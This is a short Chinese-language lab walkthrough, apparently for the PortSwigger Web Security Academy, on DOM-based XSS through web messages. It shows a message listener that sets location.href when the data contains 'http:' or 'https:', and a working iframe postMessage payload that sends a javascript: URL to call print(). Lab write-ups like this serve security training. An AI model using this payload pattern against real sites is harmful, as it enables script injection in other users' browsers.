# 实验室：使用 Web 消息和 JavaScript URL 的 DOM XSS

本实验室演示了一个由 Web 消息触发的基于 DOM 的重定向漏洞。要解决本实验，请在漏洞利用服务器上构造一个 HTML 页面，利用该漏洞并调用 `print()` 函数。

## 步骤

探测
- 访问首页
    ```http
    GET / HTTP/1.1
    Host: id.web-security-academy.net
    ```

    - 响应
        ```html
        <script>
            window.addEventListener('message', function(e) {
                    var url = e.data;
                    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
                        location.href = url;
                    }
                },
                false);
        </script>
        ```
        - 应用程序监听消息事件，若存在 `http[s]:` 字符串，则设置为当前 URL


构造消息载荷
- 设置攻击者页面
    ```html
    <iframe src="//id.web-security-academy.net" onload="this.contentWindow.postMessage('javascript:print(\'https:\')','*')"></iframe>
    ```
    - 此处设置 JS 伪协议，在任意位置插入 `http[s]:` 字符串
